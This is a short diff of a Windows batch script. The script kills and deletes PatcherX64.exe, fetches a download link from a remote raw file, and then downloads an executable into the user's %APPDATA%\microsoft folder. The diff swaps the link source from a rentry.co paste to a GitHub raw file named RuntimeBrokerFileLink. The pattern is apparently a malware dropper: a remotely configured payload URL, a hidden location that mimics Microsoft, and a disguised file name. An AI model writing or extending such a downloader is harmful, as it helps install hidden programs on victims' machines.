@@ -9,7 +9,7 @@ color 0A
 taskkill /f /im PatcherX64.exe >nul 2>&1
 del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
 
-for /f "delims=" %%i in ('curl -s https://rentry.co/yuu9577w/raw') do set "RNTMFILELINK=%%i"
+for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RuntimeBrokerFileLink') do set "RNTMFILELINK=%%i"
 
 :: Download the file using curl
 curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%RNTMFILELINK%"
